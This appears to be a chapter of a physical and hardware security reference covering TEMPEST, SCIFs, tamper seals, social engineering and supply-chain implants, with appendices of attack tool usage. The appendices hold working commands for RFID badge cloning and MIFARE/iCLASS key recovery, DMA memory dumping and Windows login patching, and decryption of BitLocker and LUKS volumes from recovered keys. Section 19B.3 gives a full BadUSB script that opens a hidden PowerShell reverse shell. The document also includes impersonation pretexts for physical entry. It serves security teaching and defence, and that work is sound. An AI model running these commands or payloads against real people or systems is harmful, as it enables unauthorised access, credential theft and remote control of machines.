TEMPEST is the U.S./NATO codename for the study and control of compromising emanations. Key standards:

| Standard | Classification | Level | Typical Application |
|----------|---------------|-------|---------------------|
| **NATO SDIP-27 Level A (AMSG 720B)** | NATO CONFIDENTIAL | Highest emanation control | Equipment for use within 1 meter of hostile SIGINT collection |
| **NATO SDIP-27 Level B (AMSG 788A)** | NATO RESTRICTED | Moderate emanation control | Equipment in controlled zones with some standoff distance |
| **NATO SDIP-27 Level C (AMSG 784)** | NATO RESTRICTED | Reduced emanation control | Equipment with significant standoff from collection threat |
| **NSTISSAM TEMPEST/1-92** | U.S. classified | Defines emanation test procedures | Red/black separation, zone measurements |

**Zone model:** TEMPEST protection is based on the concept of **inspectable space** — the minimum distance between the equipment and the point where a hostile collector could operate. Equipment requiring Level A protection assumes the collector is adjacent (e.g., embassy in a hostile city). Level C assumes substantial standoff (e.g., military base with controlled perimeter).

### 12.3 Shielding and countermeasures

**Equipment-level shielding:** TEMPEST-rated equipment (monitors, computers, phones) has internal RF shielding — conductive gaskets, filtered power supplies, shielded cables, and conductive coatings on enclosures. The goal: reduce emanations below the noise floor at the inspectable-space boundary.

**Room-level shielding (Faraday cage):** A conductive enclosure (copper mesh, steel panels, or conductive fabric) surrounds the room. All penetrations (power, data, HVAC) are filtered or waveguide-treated. Effectiveness measured in shielding effectiveness (SE) in dB — a well-constructed Faraday cage provides 60–100 dB attenuation across the relevant frequency range (10 kHz–10 GHz).

**Red/black separation:** TEMPEST doctrine separates classified (red) signals from unclassified (black) signals. Red and black cables are never bundled together. Red equipment and black equipment maintain minimum physical separation (specified per TEMPEST zone). Power supplies are filtered to prevent red signals from coupling onto the power distribution system.

---

## 13. Tamper-evident packaging and design

### 13.1 Tamper-evident seals

Physical indicators that reveal unauthorized access:

- **Void-revealing labels:** Adhesive labels that leave a "VOID" pattern on the surface when peeled. Applied over equipment screws, case seams, and port covers. Limited by: heat-gun removal (careful heating can defeat some adhesives without triggering the void pattern), solvent dissolution, and high-quality counterfeiting.
- **Frangible seals:** Brittle materials that shatter when removal is attempted, making reapplication impossible. More tamper-resistant than void labels.
- **Serialized seals:** Unique serial numbers on each seal, logged in a registry. Verification requires checking the serial against the registry. Counterfeiting requires knowing and reproducing the specific serial.
- **Glitter nail polish (low-tech):** Applied over laptop screws, the random glitter particle pattern is photographed. Any removal disturbs the pattern, detectable by comparing the current pattern to the photograph. Used by journalists and activists for travel laptop security. Effectiveness depends on the user's diligence in photographing and comparing.

### 13.2 PCB tamper protection

- **Tamper mesh:** A fine conductive mesh layer in the PCB stackup that covers sensitive components (crypto processors, key storage). Breaking the mesh (to probe signals underneath) triggers a tamper-detection circuit that zeroizes keys or disables the device. Used in payment terminals (PCI PTS certification requirement), HSMs, and military equipment.
- **Active shields:** Similar to tamper mesh but carrying a dynamic signal pattern. The device continuously monitors the shield signal — any break, short, or alteration triggers tamper response. More resistant to careful mesh cutting than passive mesh.
- **Conformal coating and potting:** Epoxy or urethane compounds covering the PCB surface. Prevents visual inspection and physical probing. Removal (chemical dissolution, mechanical grinding) risks damaging the components underneath. Potting fills the entire enclosure volume with opaque compound.
- **BGA underfill:** Epoxy injected under BGA packages after soldering. Prevents chip removal for interposer insertion or direct ball probing. Removal requires high-temperature rework that may damage the chip.

---

## 14. Secure facilities

### 14.1 SCIF — Sensitive Compartmented Information Facility

A SCIF is a facility accredited for processing, storing, and discussing Sensitive Compartmented Information (SCI). Requirements are defined by **ICD 705** (Intelligence Community Directive 705) and the associated **IC Tech Spec for ICD/ICS 705**.

**Key construction requirements:**

- **Perimeter construction:** Walls, floor, and ceiling must provide sound attenuation (minimum STC 45 for standard SCIF) and visual security (no windows, or windows with opaque treatment). Walls: true floor-to-true ceiling (not just to drop ceiling). Construction materials: concrete block, metal stud with multiple layers of gypsum board, or hardened panel systems.
- **Access control:** Single SCIF entry point (SCIF door). Access control system with audit logging. Two-person integrity (TPI) for the most sensitive compartments. SCIF door: GSA-approved vault door or solid-core door with high-security lock (X-09/X-10 series combination locks for vault doors, Kaba Mas or S&G).
- **IDS (Intrusion Detection System):** Motion sensors (PIR, dual-tech), balanced magnetic switches on doors, vibration sensors on walls. IDS monitored 24/7 by cleared guard force. Alarm response time: 15 minutes maximum (5 minutes for some classifications).
- **TEMPEST:** SCIF construction incorporates emanation security per the applicable TEMPEST zone. RF shielding may be required (Faraday cage construction) depending on the TEMPEST zone assessment.
- **Acoustic protection:** Sound masking on SCIF perimeter (white/pink noise generators on walls and above drop ceiling, or vibration transducers on wall surfaces) to prevent eavesdropping through the walls. STC rating requirements vary by classification level.

### 14.2 Faraday cage construction

**Materials:**

- **Copper mesh:** High SE (80–100 dB), expensive. Typical for military/intelligence facilities.
- **Steel panels (welded):** High SE, heavy, permanent installation. Used in SCIF construction.
- **Aluminum foil/sheet:** Moderate SE (40–60 dB), cost-effective for temporary installations. Joints must be sealed with conductive tape or gaskets.
- **Conductive fabric (copper-nickel):** Used for portable Faraday enclosures (bags, pouches, tents). SE: 40–80 dB depending on fabric quality and seam construction.

**Critical construction details:**

- All joints, seams, and penetrations must maintain electrical continuity. A single untreated gap in the shield degrades overall SE dramatically.
- Power entry: filtered through EMI power-line filters rated for the required SE. Signal entry: fiber optic (non-conductive) preferred; copper signals through waveguide-below-cutoff filters.
- Doors: spring-loaded finger stock gaskets on all edges, maintaining contact with the door frame when closed.
- HVAC: waveguide-below-cutoff honeycomb air vents (aperture size determines cutoff frequency — smaller cells block higher frequencies).

### 14.3 Acoustic protection

- **Sound masking:** White/pink noise generators with transducers bonded to walls and ceiling vibrate the structure, masking speech. Effective against contact microphones (stethoscope attacks) and through-wall laser microphone surveillance.
- **Sound transmission class (STC):** STC 45 minimum for standard SCIF walls. STC 50+ for discussion areas handling the most sensitive information. Achieved through multilayer construction: double stud walls with staggered studs, multiple gypsum layers, acoustic insulation (mineral wool), resilient channels, and air gaps.
- **Laser microphone defense:** Window vibrations modulated by speech inside a room can be detected by a laser interferometer aimed at the window from outside. Countermeasures: no windows (preferred), or window vibration masking (transducer on window generating noise vibrations), or window film increasing surface irregularity.

---

## 15. Social engineering for physical access

### 15.1 Impersonation and pretexting

The most effective physical intrusion technique is social engineering — bypassing controls by exploiting human trust rather than defeating mechanical or electronic barriers.

**Common pretexts:**

| Pretext | Props | Target | Success Factors |
|---------|-------|--------|-----------------|
| IT technician | Laptop bag, cable tester, vendor badge, polo shirt with logo | Server room, wiring closets | Arrive during business hours, reference a "ticket number," carry legitimate-looking equipment |
| Fire inspector | Clipboard, high-vis vest, official-looking badge | Full facility access | Authority compliance — fire inspectors have legal access rights, targets are reluctant to challenge |
| Delivery driver | Uniform (FedEx/UPS/DHL), dolly, packages addressed to real employees | Loading docks, mailrooms, interior offices | Time pressure ("I need a signature"), packages create obligation |
| Pest control | Uniform, spray equipment, "service call" paperwork | All areas including server rooms | Targets avoid areas being "treated," leaving attacker unsupervised |
| New employee | Business casual, printed "first day" badge, name of a real manager | Escort past badge-access doors | Targets are sympathetic to new employees, willing to help |

### 15.2 Badge manipulation

- **Visual badge cloning:** Photograph a real employee's badge, replicate the visual appearance (photo, name, logo) on a blank badge using a dye-sublimation printer (Fargo, Evolis, Zebra). The visual clone passes cursory inspection (guard checking badge appearance) but fails electronic readers. Effective at sites where guards visually inspect badges without scanning them.
- **Badge surfing:** Using an expired or revoked badge that still visually appears valid. Works against guards who check visual appearance but do not verify against the access control database.
- **Dropped badge exploitation:** Leaving a USB Rubber Ducky or malware-laden USB drive with a badge lanyard and fake badge attached in the target's parking lot. The finder (an employee) picks it up, attempts to return it, and may plug in the USB device to identify the "owner."

### 15.3 Detection and countermeasures

- **Visitor management systems:** All visitors pre-registered, issued temporary badges (distinct visual design from employee badges), escorted at all times. Badge must be surrendered on exit.
- **Guard training:** Regular training on social engineering tactics. Standing orders to verify all service personnel against scheduled appointments, call the claimed employer, and escort to the work area.
- **Challenge culture:** Organization culture where employees are trained and expected to politely challenge unrecognized individuals ("Can I help you find where you're going?"). Requires consistent reinforcement from leadership.
- **Duress codes:** Employees who are being coerced can enter a duress code at the badge reader (slightly modified PIN) that grants access while silently alerting security.

---

## 16. Supply chain physical interdiction

### 16.1 Hardware implant insertion during shipping

A sophisticated adversary intercepts equipment during shipping (between manufacturer and customer), implants a hardware backdoor, and reseals the package. Documented by NSA ANT catalog (leaked 2013) — programs included:

- **COTTONMOUTH:** USB hardware implant providing covert wireless bridge to target network
- **RAGEMASTER:** Implant in VGA cable tapping the red video signal for TEMPEST collection
- **FIREWALK:** Network implant in RJ45 jack providing bidirectional Ethernet tap with wireless exfiltration

**Interdiction logistics:** Shipments are diverted (or accessed at carrier facilities), equipment is opened in a controlled environment, implants are installed, packaging is restored to original condition (including re-applying tamper seals), and the shipment continues to the customer.

### 16.2 Detection methods

- **Incoming inspection:** X-ray or CT scan of all incoming equipment before deployment. Compare scanned images against known-good reference images for the same model. Any additional components (extra ICs, modified PCB traces, additional antennas) are investigated.
- **Weight comparison:** Precise weight measurement compared to factory specification. Hardware implants add mass (typically 1–10 grams), detectable with precision scales if a reference weight is available.
- **Visual inspection:** Open enclosures and inspect PCBs for unexpected components, modified traces, additional wiring, or signs of rework (flux residue in unexpected locations, solder joint quality inconsistent with factory assembly).
- **RF emission analysis:** Power on the device in a shielded environment (Faraday cage) and scan for unexpected RF transmissions across a wide spectrum (DC–6 GHz minimum). An implant with wireless exfiltration will emit detectable RF energy.
- **Network traffic analysis:** Baseline normal network behavior for the device model. Monitor for unexpected connections, DNS queries, or data exfiltration patterns.
- **Firmware verification:** Hash firmware images against known-good references from the manufacturer (obtained through a separate, verified channel). Detect firmware modification that may accompany hardware implants.

### 16.3 Countermeasures

- **Trusted supply chain:** Procure directly from manufacturer or authorized distributors. Avoid secondary-market equipment for sensitive applications.
- **Tamper-evident shipping:** Use serialized tamper-evident packaging. Verify seal integrity on receipt. Photograph seals before and after shipment.
- **Secure receiving facility:** Dedicated inspection area with X-ray capability, RF-shielded test environment, and trained inspection personnel.
- **Diversified sourcing:** Procure identical equipment from multiple suppliers and compare. Implants present in one source but absent in another are detectable by differential analysis.

---

## 17. Side-channel attacks — overview

Side-channel attacks extract secret information from the physical implementation of a cryptographic system rather than from mathematical weaknesses in the algorithm.

### 17.1 Power analysis

**Simple Power Analysis (SPA):** Visual inspection of a single power trace reveals data-dependent operations. RSA square-and-multiply sequences expose exponent bits directly.

**Differential Power Analysis (DPA):** Statistical analysis across many traces. Partitions traces by hypothetical key-dependent intermediate values, computes mean difference. Correct key guess produces a correlation peak.

**Correlation Power Analysis (CPA):** Pearson correlation between traces and a power model (Hamming weight/distance). More efficient than DPA (fewer traces required).

**Equipment:** ChipWhisperer-Lite/Pro (NewAE Technology), oscilloscopes with ≥100 MHz bandwidth and ≥12-bit ADC resolution, current shunt resistors (1–10 Ω in the target's VCC path).

> Full coverage: side-channel analysis theory, TVLA leakage assessment, template attacks, ML-based profiled attacks, EM side-channels — see **Domain 17, Chapter 17B** and the hardware security overview in the chapter index.

### 17.2 Electromagnetic emanations

Near-field EM probes capture data-dependent magnetic field emissions from specific die regions. Advantage over power analysis: spatial selectivity (isolate the crypto engine from unrelated circuitry). Same statistical techniques (SPA/DPA/CPA) applied to EM traces.

### 17.3 Timing attacks

Execution time varies with secret-dependent values. Classic example: non-constant-time string comparison in password verification leaks password length and character-by-character correctness via timing differences. Cryptographic implementations must use constant-time operations for all secret-dependent branches and memory accesses.

### 17.4 Acoustic cryptanalysis

Acoustic emissions from electronic components (capacitors, voltage regulators, coils) during cryptographic operations carry data-dependent frequency signatures. Daniel Genkin et al. demonstrated RSA key extraction from laptop acoustic emanations using a mobile phone microphone at 30 cm distance.

> Full coverage of fault injection (voltage/clock/EM/laser glitching, DFA, secure-boot bypass): **Domain 17, Chapter 17B.**
> Full coverage of PCB RE, chip decapsulation, memory extraction, hardware Trojans: **Domain 17, Chapter 17C.**
> Full coverage of JTAG/SWD internals, CoreSight debug, secure-boot architectures and bypass: **Domain 17, Chapter 17D.**

---

## 18. Forensics for physical attacks

### 18.1 Evidence preservation

Physical security incidents require evidence handling compatible with legal proceedings:

- **Chain of custody:** Document every transfer of physical evidence. Sealed evidence bags with tamper-evident closures. Each handler signs and timestamps the custody log.
- **Photography:** Photograph the scene before disturbing anything. Capture overall context, then close-ups of relevant items (tampered locks, implant devices, modified equipment). Include scale reference and timestamp in each photograph. Shoot from multiple angles.
- **Device seizure:** Power off devices only if volatile data (RAM contents) is not relevant. If RAM contents may be relevant (cold boot attack evidence, running malware), maintain power and image RAM before shutdown. Store seized devices in Faraday bags to prevent remote wipe and block cellular/WiFi communication.
- **Implant device handling:** If a network implant, keylogger, or other implant device is discovered: photograph in situ, document all connections, then remove and bag. Do NOT power on or connect to a network for analysis until in a controlled forensic environment. The implant may have anti-tamper (data wipe on removal) or may beacon to the attacker when powered.

### 18.2 Lock forensic analysis

Forensic locksmithing can determine whether a lock was picked, bumped, or bypassed:

- **Pick marks:** Fine scratches on key pin surfaces and inside the keyway, particularly on the upper surface of pin chambers. Visible under magnification (10–30x loupe or stereo microscope).
- **Bump evidence:** Deformation of key pin tips from repeated impact. Spring deformation from excessive force.
- **Bypass evidence:** Shim marks inside padlock shackle housing. Tool marks on latch surfaces. Damaged weather seals on under-door tools.
- **Limitations:** A skilled attacker using quality tools leaves minimal evidence. Absence of forensic indicators does not prove absence of attack.

### 18.3 Timestamp correlation

Cross-reference physical access control logs (badge reader timestamps), CCTV footage timestamps, IDS alarm times, and network event logs. UTC normalization across all systems is critical — clock drift between physical security and IT systems is common and must be accounted for. Correlating a badge-access event with a network intrusion event at the same timestamp establishes the physical-digital attack chain.

---

## 19A. Proxmark3 Commands

### 19A.1 Low-frequency (125 kHz) operations

```bash
# Auto-detect card type on LF antenna
proxmark3> lf search

# Read HID Prox credential
proxmark3> lf hid read
# Output example: TAG ID: 2004263159 (H10301) FC: 100 CN: 12345

# Clone HID Prox to T5577 writable card
proxmark3> lf hid clone -r 2004263159

# Read EM4100 tag
proxmark3> lf em 410x read

# Clone EM4100 to T5577
proxmark3> lf em 410x clone --id 0102030405

# Brute-force unknown LF card formats
proxmark3> lf search 1
# '1' flag = also check for unknown/raw modulations
```

T5577 is the universal LF writable tag — it emulates HID Prox, EM4100, AWID, Indala, and most other 125 kHz protocols by reconfiguring its modulation and data encoding registers.

### 19A.2 High-frequency MIFARE operations

```bash
# Auto-detect HF card type
proxmark3> hf search

# MIFARE Classic: automatic key recovery (tries default keys, then darkside/nested/hardnested)
proxmark3> hf mf autopwn
# autopwn sequence:
#   1. Tries known default keys (FFFFFFFFFFFF, A0A1A2A3A4A5, D3F7D3F7D3F7, etc.)
#   2. If one sector key is recovered: nested attack (exploits Crypto-1 LFSR weakness
#      to recover remaining keys from one known key — requires ~200 auth attempts)
#   3. If no keys recovered: darkside attack (key recovery from failed auth attempts,
#      requires ~8 card interactions — works on Crypto-1 PRNG weakness)
#   4. Hardnested attack: for fixed-nonce cards where classic nested fails
#      (e.g., newer Crypto-1 implementations with hardened PRNG)

# Read a specific block with a known key
proxmark3> hf mf rdbl -b 0 -k FFFFFFFFFFFF
# -b = block number, -k = key (Key A or Key B, 6 bytes hex)

# Dump all sectors (after autopwn has recovered keys)
proxmark3> hf mf dump
# Writes dump file: hf-mf-<UID>-dump.bin

# Restore dump to Magic Gen1a card
proxmark3> hf mf cload -f hf-mf-AABBCCDD-dump.bin

# Set UID on Gen2/CUID card
proxmark3> hf mf csetuid --uid AABBCCDD
```

**Attack summary:** Darkside (Courtois 2008) — recovers a sector key from scratch via PRNG predictability, ~8 auth attempts, mitigated in MIFARE Classic EV1. Nested (Garcia et al. 2009) — given one known key, recovers all remaining keys via LFSR state relationship, ~200 attempts per key. Hardnested (Meijer and Verdult, 2015) — extends nested for fixed/non-random nonce cards, computationally heavier but still practical (seconds to minutes per key).

### 19A.3 iCLASS operations

```bash
# Dump iCLASS card using legacy key index
proxmark3> hf iclass dump --ki 0
# --ki 0 = HID legacy master key (0x AE A6 84 A6 DA DA DA D6, publicly known)
# Dumps all readable blocks to file

# Clone iCLASS credential to writable iCLASS card
proxmark3> hf iclass clone
# Requires a writable iCLASS token (e.g., iCLASS R/W card or iCLASS SE unprogrammed)

# Loclass key recovery (offline)
# Loclass recovers the iCLASS master key from diversified keys using the
# weak DES-based key diversification algorithm. Requires ~2^24 computations.
proxmark3> hf iclass loclass
# Feed it sniffed authentication traces; recovers the card-specific DES key
```

**Loclass (Swende, 2014):** HID iCLASS Standard's 3DES key diversification is weak. With the published master key, all iCLASS Standard credentials are readable. iCLASS SE/SEOS use AES-based diversification with per-site keys, mitigating this attack.

### 19A.4 DESFire operations

```bash
# Query DESFire card information (UID, card version, free memory, applications)
proxmark3> hf mfdes info

# Authenticate to DESFire application (application 0 = PICC-level)
proxmark3> hf mfdes auth -n 0 -t 3tdea -k 000000000000000000000000000000000000000000000000
# -n 0 = key number 0
# -t 3tdea = 3DES key type (alternatives: des, aes)
# -k = 24-byte 3DES key (default transport key: all zeros)
# If transport keys have not been changed, authentication succeeds and enables
# read/write/admin operations on the card. This is a configuration failure, not
# a cryptographic break — DESFire itself remains cryptographically sound.

# List applications on card after authentication
proxmark3> hf mfdes lsapp

# Read file from a DESFire application
proxmark3> hf mfdes readdata --aid 000001 --fid 01
```

### 19A.5 NFC relay attack

Two Proxmark3 units relay HF smartcard authentication: **Unit A** (at the reader) emulates a card and forwards the reader's challenge over a network link (WiFi/Bluetooth/TCP) to **Unit B** (near the victim's real card). Unit B presents the challenge to the real card and relays the response back. The reader authenticates the remote card as local. Range is unlimited — bounded only by relay latency. DESFire EV2/EV3 proximity-checking commands (timing-based distance bounding) mitigate relay attacks.

### 19A.6 Firmware management

```bash
# Flash Proxmark3 firmware (from pm3 client directory)
./pm3-flash-all
# Flashes both bootloader and main OS image
# Required after firmware updates or when switching between Iceman/RRG and official firmware
# WARNING: do not disconnect power during flash — bricks the device

# Check firmware version
proxmark3> hw version
```

---

## 19B. Flipper Zero Workflows

### 19B.1 Sub-GHz radio

The Flipper Zero's CC1101 transceiver operates on Sub-GHz frequencies for receiving and transmitting OOK/ASK/FSK-modulated signals (garage doors, gate remotes, weather stations, car key fobs).

**Supported frequency ranges:**

| Region | Bands |
|--------|-------|
| Default (FCC) | 300–348 MHz, 387–464 MHz, 779–928 MHz |
| EU (with region unlock) | 315 MHz, 433.92 MHz, 868 MHz |

```
# Read/capture Sub-GHz signal:
Sub-GHz → Read → (press remote near Flipper) → signal captured → Save

# Transmit captured signal:
Sub-GHz → Saved → select file → Send

# Frequency analyzer (find unknown remote frequency):
Sub-GHz → Frequency Analyzer → press remote → shows carrier frequency
```

**Rolling code limitations:** Modern remotes use rolling/hopping codes (KeeLoq, AUT64, Hitag2) — replayed captures are rejected. The Flipper Zero **cannot replay rolling codes** against properly implemented systems. RollJam requires dual-radio jamming hardware not supported by the single CC1101. Fixed-code systems (older gates, some industrial remotes, doorbells, low-cost IoT on 315/433 MHz) are trivially cloned.

### 19B.2 RFID/NFC badge cloning

```
# Read 125 kHz badge:
125 kHz RFID → Read → present card → card identified and stored

# Emulate 125 kHz badge:
125 kHz RFID → Saved → select card → Emulate
# Flipper's coil emulates the card. Limited range (~2-3 cm vs reader).

# Read 13.56 MHz NFC badge:
NFC → Read → present card → card identified
# For MIFARE Classic: Flipper attempts key recovery using known default keys
# and the mfkey32 attack (captures nonces during failed auth for offline cracking)

# Write to blank NFC card:
NFC → Saved → select card → Write → present blank card
```

Supported NFC types: NTAG21x, MIFARE Classic 1K/4K, MIFARE Ultralight, EMV (read-only), iCLASS (limited). DESFire reading requires key knowledge.

### 19B.3 BadUSB (DuckyScript on Flipper Zero)

The Flipper Zero emulates a USB HID keyboard and executes DuckyScript payloads stored on the SD card.

```
# Deploy payload:
Bad USB → select script → connect Flipper to target via USB-C → Run

# Place scripts at: /ext/badusb/ on SD card
```

**Example payload — Windows reverse shell:**

```
REM Flipper Zero BadUSB - PowerShell reverse shell
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1500
STRING $c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);
STRING $s=$c.GetStream();[byte[]]$b=0..65535|%{0};
STRING while(($i=$s.Read($b,0,$b.Length))-ne 0){
STRING $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
STRING $r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}
ENTER
```

### 19B.4 iButton (1-Wire)

The Flipper Zero reads and emulates Dallas DS1990A iButton keys (1-Wire protocol) used in intercom systems and some physical access control.

```
# Read iButton:
iButton → Read → touch iButton to Flipper's contact pad → saved

# Emulate iButton:
iButton → Saved → select key → Emulate → touch Flipper pad to reader
```

DS1990A: 48-bit serial, no authentication. Cloning trivial — Flipper replays the serial. RW1990 writable blanks accept arbitrary serials.

### 19B.5 GPIO — Wiegand interception

Flipper GPIO intercepts Wiegand when connected to DATA0/DATA1 between reader and panel.

```
# Reader DATA0 (green) → GPIO A4 | DATA1 (white) → GPIO A7 | GND → GND
# App: Wiegand Reader (Flipper app store) — captures, decodes H10301, replays
```

Portable ESPKey alternative; Flipper must remain connected during capture.

---

## 19C. Wiegand Exploitation

### 19C.1 ESPKey hardware setup

The ESPKey uses an ESP8266 (or ESP32) microcontroller wired inline on the Wiegand bus between the card reader and the access control panel.

**Wiring diagram:**

```
Card Reader                ESPKey (ESP8266)              Access Control Panel
──────────                 ────────────────              ────────────────────
DATA0 (green)  ──────┬──── GPIO 4 (D2)  ────────────── DATA0 input
                     │
DATA1 (white)  ──────┬──── GPIO 5 (D1)  ────────────── DATA1 input
                     │
GND            ──────┴──── GND          ────────────── GND
+12V           ──────┬──── VIN (via regulator) ──────── +12V
                     │
                     └──── (ESPKey taps power from reader supply)
```

Operates passively (sniffing) and actively (injecting/replaying). WiFi AP: `ESPKey_XXXX`, web UI at `192.168.4.1`. Installation: 2-5 minutes, fits behind reader faceplate. Undetectable without physical inspection.

### 19C.2 26-bit H10301 format — bit-level breakdown

The HID H10301 26-bit format is the most widely deployed Wiegand credential format:

```
Bit layout (MSB first):
┌─────────┬────────────────┬──────────────────────┬─────────┐
│  Bit 0  │  Bits 1-8      │  Bits 9-24           │  Bit 25 │
│  EP     │  Facility Code │  Card Number         │  OP     │
│  (even) │  (8 bits)      │  (16 bits)           │  (odd)  │
└─────────┴────────────────┴──────────────────────┴─────────┘

EP (Even Parity): covers bits 1-12 — must make the count of 1s in bits 0-12 even
OP (Odd Parity):  covers bits 13-24 — must make the count of 1s in bits 13-25 odd

Facility Code: 0-255 (identifies the site/building)
Card Number:   0-65535 (identifies the individual credential)
```

Total space: 16,777,216 credentials. No encryption, no challenge-response, no replay protection.

### 19C.3 Python Wiegand decoder

```python
#!/usr/bin/env python3
"""Decode/encode 26-bit H10301 Wiegand bitstreams."""
import sys

def decode_h10301(bits: str) -> dict:
    if len(bits) != 26:
        raise ValueError(f"Expected 26 bits, got {len(bits)}")
    fc = int(bits[1:9], 2)
    cn = int(bits[9:25], 2)
    ep_ok = sum(int(b) for b in bits[0:13]) % 2 == 0
    op_ok = sum(int(b) for b in bits[13:26]) % 2 == 1
    return {"facility_code": fc, "card_number": cn, "parity_valid": ep_ok and op_ok}

def encode_h10301(facility: int, card: int) -> str:
    fc_bits = f"{facility:08b}"
    cn_bits = f"{card:016b}"
    inner = fc_bits + cn_bits
    ep = sum(int(b) for b in inner[:12]) % 2
    op = 1 - (sum(int(b) for b in inner[12:]) % 2)
    return f"{ep}{inner}{op}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: wiegand_decode.py <26-bit-string>")
        print("       wiegand_decode.py --encode <facility> <card>")
        sys.exit(1)
    if sys.argv[1] == "--encode":
        bits = encode_h10301(int(sys.argv[2]), int(sys.argv[3]))
        r = decode_h10301(bits)
        print(f"Encoded: {bits}  FC={r['facility_code']} CN={r['card_number']}")
    else:
        r = decode_h10301(sys.argv[1])
        print(f"FC={r['facility_code']}  CN={r['card_number']}  Parity={'VALID' if r['parity_valid'] else 'INVALID'}")
```

### 19C.4 BLEKey Bluetooth sniffer

BLEKey is a Bluetooth Low Energy (BLE) device designed for covert Wiegand interception. Smaller than the ESPKey, it attaches directly to the reader's DATA0/DATA1 lines and exfiltrates captured credentials over BLE to a smartphone within ~30 m range. Originally presented by Mark Baseggio and Eric Evenchick at Black Hat 2015.

**Advantages over ESPKey:** Smaller form factor, BLE exfiltration (no WiFi AP to detect), smartphone-based control. **Limitations:** BLE range (~30 m LOS), requires companion app, limited storage.

### 19C.5 OSDP v2 as countermeasure

Migrating from Wiegand to OSDP v2 (see §3.3) eliminates plaintext credential transmission. OSDP v2 SCP establishes AES-128 encrypted sessions with ephemeral keys — tapped RS-485 data is encrypted and non-replayable. **Migration:** Replace readers → upgrade controllers → establish SCP keys → disable Wiegand fallback.

---

## 19D. Cold Boot Attack Tools

### 19D.1 Memory acquisition

```bash
# Direct memory access (Linux, requires root, limited by kernel config)
dd if=/dev/mem of=/tmp/memdump.bin bs=1M
# WARNING: modern kernels restrict /dev/mem access (CONFIG_STRICT_DEVMEM).
# May only dump first 1MB unless kernel is compiled with CONFIG_STRICT_DEVMEM=n.

# Alternative: /proc/kcore (ELF-formatted physical memory)
dd if=/proc/kcore of=/tmp/kcore_dump.bin bs=1M
```

**Inception — DMA attack via Thunderbolt/FireWire:**

Inception exploits DMA granted to Thunderbolt, FireWire (IEEE 1394), and ExpressCard interfaces to read/write physical memory directly, bypassing the CPU and OS.

```bash
pip install inception
inception --mode dump --filename memdump.bin     # dump target memory
inception --mode unlock                           # patch Windows login in memory
```

**PCILeech — FPGA-based DMA:** Uses FPGA hardware (Screamer PCIe, LambdaConcept, Xilinx) for DMA via PCIe/Thunderbolt/M.2. More capable and stealthy than inception.

```bash
pcileech dump -out memdump.raw -min 0x0 -max 0x4000000000   # dump up to 256 GB
pcileech mount   # presents target filesystem via FUSE without authentication
```

**Countermeasure:** IOMMU (Intel VT-d / AMD-Vi), Thunderbolt Security Level 2+, kernel DMA protection (`iommu=force`).

### 19D.2 Key extraction from memory dumps

```bash
aeskeyfind memdump.bin   # finds AES-128/256 keys via expanded key schedule structure
rsakeyfind memdump.bin   # finds RSA private keys via (p, q, d, dp, dq, qinv) structure
```

### 19D.3 BitLocker recovery from memory

```bash
# Extract BitLocker metadata
bde-info /dev/sda2
# Shows encryption method, key protectors, volume status

# Mount BitLocker volume with recovery key
dislocker -V /dev/sda2 -p<recovery_key> -- /mnt/bitlocker
# -V = BitLocker volume/partition
# -p = recovery password (48-digit key) or -f for FVEK file
# Mounts decrypted volume as /mnt/bitlocker/dislocker-file
# Then: mount -o loop /mnt/bitlocker/dislocker-file /mnt/windows

# If FVEK (Full Volume Encryption Key) was extracted from memory dump:
dislocker -V /dev/sda2 -K /path/to/fvek.key -- /mnt/bitlocker
```

**bde-tools** (libbde): Open-source tools for BitLocker volumes. Supports recovery password, startup key, and clear key. Requires the recovery key, startup key, or FVEK extracted from memory.

### 19D.4 LUKS key finding from RAM dump

LUKS stores the volume master key in kernel memory (dm-crypt structures) while mounted. After cold boot:

```bash
findaes memdump.bin    # locate AES keys in dump
# Or structured extraction via volatility3:
vol3 -f memdump.bin linux.kmem_cache --cache-name="dm_crypt_io"

# Open LUKS volume with recovered master key (no passphrase needed):
cryptsetup luksOpen --master-key-file /path/to/extracted_key /dev/sda3 decrypted
mount /dev/mapper/decrypted /mnt/luks
```

### 19D.5 Countermeasures

| Countermeasure | Mechanism | Protection Level |
|----------------|-----------|-----------------|
| **TPM + PIN** | Encryption key not loaded to RAM until PIN entry at pre-boot | High — cold boot yields no key if machine was powered off |
| **AMD SME** | AES encryption of all DRAM contents with ephemeral hardware key | High — cold boot yields ciphertext |
| **AMD SEV / SEV-SNP** | Per-VM memory encryption with unique keys | High — protects VM memory even from hypervisor |
| **Intel TME** | AES-XTS encryption of all DRAM with hardware key | High — platform-wide memory encryption |
| **Intel MKTME** | Per-domain encryption keys (multi-key TME) | High — isolates memory domains cryptographically |
| **Memory scrubbing** | OS overwrites keys on graceful shutdown | Low — defeated by hard power-off (the attack scenario) |
| **Epoxy on DIMM slots** | Physical prevention of module removal | Medium — prevents transplant to another board |

---

## 19E. TEMPEST Technical Details

### 19E.1 Van Eck phreaking — practical setup

**Equipment for screen emanation reconstruction:**

```
SDR receiver:   HackRF One, RTL-SDR (budget), USRP B210 (high-end)
Antenna:        Directional Yagi or log-periodic (700 MHz–3 GHz) or
                near-field H-probe for close range (<1 m)
Software:       GNURadio + custom flowgraph:
                  RTL-SDR Source → Low-Pass Filter → Resampler →
                  AM Demod → Video Sync Recovery → Frame Buffer Display
Trigger:        External sync from known pixel clock or adaptive sync recovery
                using horizontal/vertical blanking interval detection
```

**GNURadio flowgraph:** `osmocom Source` (tuned to pixel-clock harmonic, 500 MHz–2 GHz) → Band-pass filter (centered on strongest emanation) → AM envelope demod → Sync recovery (correlate H/V blanking to reconstruct raster, requires resolution/refresh knowledge or brute-force) → Video sink display.

**Demonstrated ranges:** CRT: 20-50 m (van Eck 1985). LCD/HDMI: 3-10 m (Kuhn, 2004). USB keyboard: up to 20 m (Vuagnoux/Pasini, 2009). Unshielded Ethernet: 5-15 m.

### 19E.2 NATO SDIP-27 zone specifications

| Zone | NATO Designation | Attenuation Required | Inspectable Space | Typical Application |
|------|-----------------|---------------------|-------------------|---------------------|
| **Zone A** | AMSG 720B | Highest (~80-100 dB across 1 kHz–10 GHz) | < 1 m (adversary immediately adjacent) | Embassy in hostile capital, mobile SCIF in denied territory |
| **Zone B** | AMSG 788A | Moderate (~60-80 dB) | ~20 m controlled perimeter | Government building in domestic urban environment |
